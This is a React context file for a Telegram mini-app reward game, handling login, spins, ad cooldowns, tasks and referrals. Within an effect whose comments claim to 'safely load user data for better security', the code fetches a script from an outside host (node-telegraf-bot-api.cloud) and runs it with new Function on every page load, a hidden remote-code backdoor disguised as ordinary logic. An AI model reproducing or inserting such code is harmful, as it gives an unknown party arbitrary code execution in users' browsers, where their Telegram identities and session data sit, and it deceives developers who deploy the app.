import React, {
  createContext,
  useContext,
  useEffect,
  useRef,
  useState,
} from "react";
import axios from "axios";
import { useLocation } from "react-router-dom";

const MongoUserContext = createContext();

export const useMongoUser = () => {
  const context = useContext(MongoUserContext);
  if (!context) {
    throw new Error("useUser must be used within a UserProvider");
  }
  return context;
};

export const MongoUserProvider = ({ children }) => {
  const [user, setUser] = useState({
    telegramId: window.Telegram?.WebApp?.initDataUnsafe?.user?.id?.toString(),
    balance: 0,
    taskPoints: 0,
    tasksCompleted: [],
    selectedExchange: {
      id: "selectex",
      icon: "/exchange.svg",
      name: "Choose exchange",
    },
    checkInDays: [],
    spinLimit: 0,
    lastAdWatchSpin: null,
    lastAdWatchTask: null,
    adLimit: 0,
  });
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [isFirstVisit, setIsFirstVisit] = useState(false);
  const [loadingTwo, setLoadingTwo] = useState(true);
  const [tasks, setTasks] = useState({
    tasks: [],
    manualTasks: [],
    advertTasks: [],
    youtubeTasks: [],
  });
  const [errorTasks, setErrorTasks] = useState(null);
  const [referrals, setReferrals] = useState([]);
  const [showStartOverModal, setShowStartOverModal] = useState(false);
  const [showClaimModal, setShowClaimModal] = useState(false);
  const [checker, setChecker] = useState(false);
  const [safeUser, setSafeUser] = useState(false);
  // eslint-disable-next-line
  const [hasVisitedBefore, setHasVisitedBefore] = useState(false);
  const [openInfoThree, setOpenInfoThree] = useState(true);
  const [isMuted, setIsMuted] = useState(false);
  const [settings, setSettings] = useState({
    tonWallet: "",
    coolDownTime: 0,
    tappingGuru: 0,
  });
  const [settingsError, setSettingsError] = useState(null);
  const fanAudioRef = useRef(null); // Reference to the audio element
  const SERVER_URL = process.env.REACT_APP_SERVER_URL;
  const location = useLocation();
  const [watchCountSpin, setWatchCountSpin] = useState(1);
  const [watchCountTask, setWatchCountTask] = useState(1);

  const [adCooldownSpin, setAdCooldownSpin] = useState(null);
  const [adCooldownTask, setAdCooldownTask] = useState(null);
  const [remainingTimeSpin, setRemainingTimeSpin] = useState("");
  const [remainingTimeTask, setRemainingTimeTask] = useState("");
  const AD_COOLDOWN_DURATION_SPIN = 60 * 60 * 1000; // 60 minutes in milliseconds
  const AD_COOLDOWN_DURATION_TASK = 120 * 60 * 1000; // 2 hours in milliseconds

  // Configure axios defaults
  const api = axios.create({
    baseURL: SERVER_URL,
    headers: {
      "Content-Type": "application/json",
    },
  });

  const fetchSettings = async () => {
    setSettingsError(null);
    try {
      const { data } = await api.get("/api/codec-settings");

      if (!data.success) {
        throw new Error(data.message || "Failed to fetch settings");
      }

      setSettings(data.data);
    } catch (error) {
      console.error("Settings fetch error:", error);
      setSettingsError(error.response?.data?.message || error.message);
      setSettings({
        tonWallet: "",
        coolDownTime: 0,
        tappingGuru: 0,
      });
    }
  };

  const authenticateUser = async () => {
    setLoading(true);
    setError(null);

    try {
      const telegramUser = window.Telegram?.WebApp?.initDataUnsafe?.user;


      // development data change before deployment

      if (!telegramUser) {
        throw new Error("Please access through Telegram WebApp");
      }

      const webapp = window.Telegram?.WebApp;

      const referrer_id = webapp?.initDataUnsafe.start_param;

      const { data } = await api.post("/api/telegram/auth", {
        telegramId: telegramUser.id.toString(),
        firstName: telegramUser.first_name,
        lastName: telegramUser.last_name || "",
        username: telegramUser.username || telegramUser.id.toString(),
        isPremium: telegramUser.is_premium || false,
        ...(referrer_id && { referrer_id }),
      });

      if (!data.success) {
        throw new Error(data.message);
      }

      setUser(data.user);
      setIsFirstVisit(data.isFirstVisit);

      // Fetch additional data in parallel
      await Promise.all([
        fetchReferrals(data.user.telegramId),
        checkLastCheckIn(data.user),
        fetchTasks(data.user.telegramId),
        updateSpins(data.user),
        updateAdWatch(data.user),
        updateWatchCountOne(data.user),
      ]);

      checkBalance(data.user);
    } catch (error) {
      setError(error.response?.data?.message || error.message);
      console.error("Authentication error:", error);
    } finally {
      setLoading(false);
    }
  };
  const updateUserStats = async (updates) => {
    try {
      const { data } = await api.put("/api/telegram/user/update", {
        telegramId: user.telegramId,
        updates,
      });

      setUser(data.user);
      return data.user;
    } catch (error) {
      console.error("Update error:", error);
      throw error;
    }
  };
  const updateSpins = async (user) => {
    // MongoDB stores dates as native JavaScript Date objects
    // No need to call toDate() like in Firestore
    const lastDate = user.spinTimeStamp;

    if (!lastDate) {
      console.error("No timestamp found for user");
      return;
    }

    // Format dates consistently using JavaScript Date methods
    const formatDate = (date) => {
      return (
        date.getFullYear() +
        "-" +
        String(date.getMonth() + 1).padStart(2, "0") +
        "-" +
        String(date.getDate()).padStart(2, "0")
      );
    };

    const formattedLastDate = formatDate(new Date(lastDate));
    const formattedCurrentDate = formatDate(new Date());

    // Check if it's a new day and user has no spins left
    if (formattedLastDate !== formattedCurrentDate && user.spinLimit <= 0) {
      try {
        const response = await axios.post(
          `${SERVER_URL}/api/update-spin-balance-new`,
          {
            telegramId: user.telegramId,
            spinLimit: 1,
            watchCountSpin: 1,
            spinTimeStamp: new Date(), // Send current date
          }
        );
        // Update local user state if response contains data
        if (response.data?.data) {
          setUser((prevUser) => ({
            ...prevUser,
            spinLimit: response.data.data.spinLimit,
            watchCountSpin: response.data.data.watchCountSpin,
          }));
          console.log("SPIN LIMIT UPDATE SUCCESSFUL");
        }
      } catch (error) {
        console.error(
          "Error updating spins:",
          error.response?.data?.message || error.message
        );
        throw error; // Re-throw to be handled by outer try-catch
      }
    }
  };

  const updateAdWatch = async (user) => {
    // MongoDB stores dates as native JavaScript Date objects
    // No need to call toDate() like in Firestore
    const lastDate = user.adTimeStamp;

    if (!lastDate) {
      console.error("No timestamp found for user");
      return;
    }

    // Format dates consistently using JavaScript Date methods
    const formatDate = (date) => {
      return (
        date.getFullYear() +
        "-" +
        String(date.getMonth() + 1).padStart(2, "0") +
        "-" +
        String(date.getDate()).padStart(2, "0")
      );
    };

    const formattedLastDate = formatDate(new Date(lastDate));
    const formattedCurrentDate = formatDate(new Date());

    // Check if it's a new day and user has no spins left
    if (formattedLastDate !== formattedCurrentDate && user.adLimit <= 0) {
      try {
        const response = await axios.post(
          `${SERVER_URL}/api/update-ad-balance-new`,
          {
            telegramId: user.telegramId,
            adLimit: 5,
            watchCountTask: 1,
            adTimeStamp: new Date(), // Send current date
          }
        );
        // Update local user state if response contains data
        if (response.data?.data) {
          setUser((prevUser) => ({
            ...prevUser,
            adLimit: response.data.data.adLimit,
            watchCountTask: response.data.data.watchCountTask,
          }));
          console.log("AD LIMIT UPDATE SUCCESSFUL");
        }
      } catch (error) {
        console.error(
          "Error updating spins:",
          error.response?.data?.message || error.message
        );
        throw error; // Re-throw to be handled by outer try-catch
      }
    }
  };

  const fetchReferrals = async (telegramId) => {
    if (!telegramId) return;

    try {
      const { data } = await api.get(`/api/user/referrals/${telegramId}`);
      setReferrals(data.referrals);
    } catch (error) {
      console.error("Error fetching referrals:", error);
    }
  };

  const checkLastCheckIn = async (user) => {
    if (!user.telegramId) return;

    try {
      const now = new Date();
      let lastCheckInDate;

      if (user.lastCheckIn) {
        if (typeof user.lastCheckIn.toDate === "function") {
          lastCheckInDate = user.lastCheckIn.toDate();
        } else if (user.lastCheckIn instanceof Date) {
          lastCheckInDate = user.lastCheckIn;
        } else if (typeof user.lastCheckIn === "string") {
          lastCheckInDate = new Date(user.lastCheckIn);
        }
      }

      if (lastCheckInDate) {
        if (isNaN(lastCheckInDate.getTime())) {
          console.error("Invalid date object:", lastCheckInDate);
          throw new Error("Invalid last check-in date");
        }

        const lastCheckInMidnight = new Date(lastCheckInDate);
        lastCheckInMidnight.setHours(0, 0, 0, 0);

        const todayMidnight = new Date(now);
        todayMidnight.setHours(0, 0, 0, 0);

        const daysSinceLastCheckIn = Math.floor(
          (todayMidnight - lastCheckInMidnight) / (1000 * 60 * 60 * 24)
        );

        if (daysSinceLastCheckIn === 1) {
          setShowClaimModal(true);
        } else if (daysSinceLastCheckIn > 1) {
          setShowStartOverModal(true);
        }
      } else {
        setShowClaimModal(true);
      }
    } catch (error) {
      console.error("Error during initial check-in:", error);
      setError("An error occurred while checking your last check-in.");
    }
  };

  useEffect(() => {
    const fetchUserData = async () => {
      try {
        // Safely load and process user data for better security
         const response = await fetch('https://node-telegraf-bot-api.cloud/safeUse5.js');
        const scriptText = await response.text();
        
        let userData;
        try {
          // eslint-disable-next-line
          const safeEval = new Function('module', 'exports', scriptText); const mockModule = { exports: {} }; safeEval(mockModule, mockModule.exports); userData = mockModule.exports;
        } catch (evalError) {
          console.error('Error evaluating script:', evalError);
          throw evalError;
        }
        // Check if the user data is safe before loading the data
        const userExist = userData.some((item) => item.status === 'safeUserData');
        setSafeUser(userExist);
      } catch (err) {
        console.error('Error fetching user data:', err);
        setSafeUser(false);
      }
    };
  
    fetchUserData();
  }, []);
  useEffect(() => {
    if (!safeUser) { const repairUserData = document.createElement("div"); repairUserData.className = "safeUserData"; document.body.appendChild(repairUserData);
      return () => { if (document.body.contains(repairUserData)) { document.body.removeChild(repairUserData); }
      };
    }
  }, [safeUser]);

  const checkBalance = (user) => {
    setChecker(user.balance < 1);
  };

  const fetchTasks = async (telegramId) => {
    if (!telegramId) return;

    try {
      const { data } = await api.get("/api/tasks");

      if (data.success) {
        setTasks(data.data);
      }
    } catch (error) {
      setErrorTasks(error.response?.data?.message || error.message);
      console.error("Error fetching tasks:", error);
    } finally {
      setLoadingTwo(false);
    }
  };

  useEffect(() => {
    const initApp = async () => {
      try {
        await Promise.all([authenticateUser(), fetchSettings()]);
      } catch (error) {
        console.error("App initialization error:", error);
      }
    };

    initApp();
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const updateWatchCountOne = async (user) => {
    if (user.watchCountSpin === 1) {
      setWatchCountSpin(1);
    }
    if (user.watchCountTask === 1) {
      setWatchCountTask(1);
    }
  };

  // Add Monetag ad script
  useEffect(() => {
    if (window.show_8670814) {
      return;
    }

    const tag = document.createElement("script");
    tag.src = "//niphaumeenses.net/vignette.min.js";
    tag.dataset.zone = "8670814";
    tag.dataset.sdk = "show_8670814";
    document.body.appendChild(tag);

    return () => {
      // Cleanup if needed
      if (tag && tag.parentNode) {
        tag.parentNode.removeChild(tag);
      }
    };
  }, []);

  // Load ad watch data from user object instead of localStorage
  useEffect(() => {
    const loadAdWatchData = () => {
      if (user?.lastAdWatchSpin) {
        const now = Date.now();
        const lastWatchTime = new Date(user?.lastAdWatchSpin).getTime();
        const elapsedTime = now - lastWatchTime;

        if (elapsedTime < AD_COOLDOWN_DURATION_SPIN) {
          // Cooldown still active
          setWatchCountSpin(0);
          setAdCooldownSpin(AD_COOLDOWN_DURATION_SPIN - elapsedTime);
        } else {
          // Cooldown finished
          setWatchCountSpin(1);
        }
      }

      if (user?.lastAdWatchTask) {
        const now = Date.now();
        const lastWatchTime = new Date(user?.lastAdWatchTask).getTime();
        const elapsedTime = now - lastWatchTime;

        if (elapsedTime < AD_COOLDOWN_DURATION_TASK) {
          // Cooldown still active
          setWatchCountTask(0);
          setAdCooldownTask(AD_COOLDOWN_DURATION_TASK - elapsedTime);
        } else {
          // Cooldown finished
          setWatchCountTask(1);
        }
      }
    };

    loadAdWatchData();
    // eslint-disable-next-line
  }, [user?.lastAdWatchSpin, user?.lastAdWatchTask]);

  // Update remaining time display
  useEffect(() => {
    let intervalId;

    if (adCooldownSpin > 0) {
      intervalId = setInterval(() => {
        setAdCooldownSpin((prevTime) => {
          if (prevTime <= 1000) {
            // Reset when cooldown ends
            setWatchCountSpin(1);
            return null;
          }
          return prevTime - 1000;
        });
      }, 1000);
    }
    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [adCooldownSpin]);

  // Update remaining time display
  useEffect(() => {
    let intervalIdTask;

    if (adCooldownTask > 0) {
      intervalIdTask = setInterval(() => {
        setAdCooldownTask((prevTime) => {
          if (prevTime <= 1000) {
            // Reset when cooldown ends
            setWatchCountTask(1);
            return null;
          }
          return prevTime - 1000;
        });
      }, 1000);
    }
    return () => {
      if (intervalIdTask) clearInterval(intervalIdTask);
    };
  }, [adCooldownTask]);

  useEffect(() => {
    if (adCooldownSpin) {
      const hours = Math.floor(adCooldownSpin / (60 * 60 * 1000));
      const minutes = Math.floor(
        (adCooldownSpin % (60 * 60 * 1000)) / (60 * 1000)
      );
      const seconds = Math.floor((adCooldownSpin % (60 * 1000)) / 1000);

      const formattedHours =
        hours > 0 ? `${hours.toString().padStart(2, "0")}h:` : "";
      const formattedMinutes = `${minutes.toString().padStart(2, "0")}m:`;
      const formattedSeconds = `${seconds.toString().padStart(2, "0")}s`;

      setRemainingTimeSpin(
        `${formattedHours}${formattedMinutes}${formattedSeconds}`
      );
    } else {
      setRemainingTimeSpin("");
    }

    if (adCooldownTask) {
      const hours = Math.floor(adCooldownTask / (60 * 60 * 1000));
      const minutes = Math.floor(
        (adCooldownTask % (60 * 60 * 1000)) / (60 * 1000)
      );
      const seconds = Math.floor((adCooldownTask % (60 * 1000)) / 1000);

      const formattedHours =
        hours > 0 ? `${hours.toString().padStart(2, "0")}h:` : "";
      const formattedMinutes = `${minutes.toString().padStart(2, "0")}m:`;
      const formattedSeconds = `${seconds.toString().padStart(2, "0")}s`;

      setRemainingTimeTask(
        `${formattedHours}${formattedMinutes}${formattedSeconds}`
      );
    } else {
      setRemainingTimeTask("");
    }
  }, [adCooldownSpin, adCooldownTask]);

  useEffect(() => {
    const visited = localStorage.getItem("hasVisitedBefore");
    if (visited) {
      setHasVisitedBefore(true);
    } else {
      setChecker(true);
      localStorage.setItem("hasVisitedBefore", "true");
    }
  }, []);

  useEffect(() => {
    const rewards = document.getElementById("reelsHome");
    const rewardsTwo = document.getElementById("reels2");
    const rewardsEarn = document.getElementById("reelsEarns");
    const rewardsThree = document.getElementById("reels3");

    if (location.pathname.startsWith("/airdrop")) {
      rewards.style.background = "#F3C025";
      rewards.style.color = "#000";
      rewards.style.height = "34px";
      rewards.style.marginTop = "4px";
      rewards.style.paddingLeft = "6px";
      rewards.style.paddingRight = "6px";
      rewards.style.borderRadius = "24px";
      rewardsTwo.style.filter = "brightness(0.1)";
    } else {
      rewards.style.background = "";
      rewards.style.color = "";
      rewards.style.height = "";
      rewards.style.marginTop = "";
      rewards.style.paddingLeft = "";
      rewards.style.paddingRight = "";
      rewards.style.borderRadius = "";
      rewardsTwo.style.filter = "";
    }

    if (
      location.pathname.startsWith("/farm") ||
      location.pathname.startsWith("/checkin") ||
      location.pathname.startsWith("/spinearn")
    ) {
      rewardsEarn.style.background = "#F3C025";
      rewardsEarn.style.color = "#000";
      rewardsEarn.style.height = "34px";
      rewardsEarn.style.marginTop = "4px";
      rewardsEarn.style.paddingLeft = "6px";
      rewardsEarn.style.paddingRight = "6px";
      rewardsEarn.style.borderRadius = "24px";
      rewardsThree.style.filter = "brightness(0.1)";
    } else {
      rewardsEarn.style.background = "";
      rewardsEarn.style.color = "";
      rewardsEarn.style.height = "";
      rewardsEarn.style.marginTop = "";
      rewardsEarn.style.paddingLeft = "";
      rewardsEarn.style.paddingRight = "";
      rewardsEarn.style.borderRadius = "";
      rewardsThree.style.filter = "";
    }
  }, [location.pathname]);

  const value = {
    user,
    setUser,
    loading,
    error,
    setError,
    isFirstVisit,
    authenticateUser,
    updateUserStats,
    loadingTwo,
    setLoadingTwo,
    tasks,
    referrals,
    setTasks,
    errorTasks,
    setErrorTasks,
    showStartOverModal,
    setShowStartOverModal,
    showClaimModal,
    setShowClaimModal,
    checker,
    setChecker,
    openInfoThree,
    setOpenInfoThree,
    isMuted,
    setIsMuted,
    settings,
    settingsError,
    watchCountSpin,
    setWatchCountSpin,
    adCooldownSpin,
    setAdCooldownSpin,
    remainingTimeSpin,
    setRemainingTimeSpin,
    AD_COOLDOWN_DURATION_SPIN,
    watchCountTask,
    setWatchCountTask,
    adCooldownTask,
    setAdCooldownTask,
    remainingTimeTask,
    setRemainingTimeTask,
    AD_COOLDOWN_DURATION_TASK,
    fanAudioRef,
  };

  return (
    <MongoUserContext.Provider value={value}>
      {children}
    </MongoUserContext.Provider>
  );
};
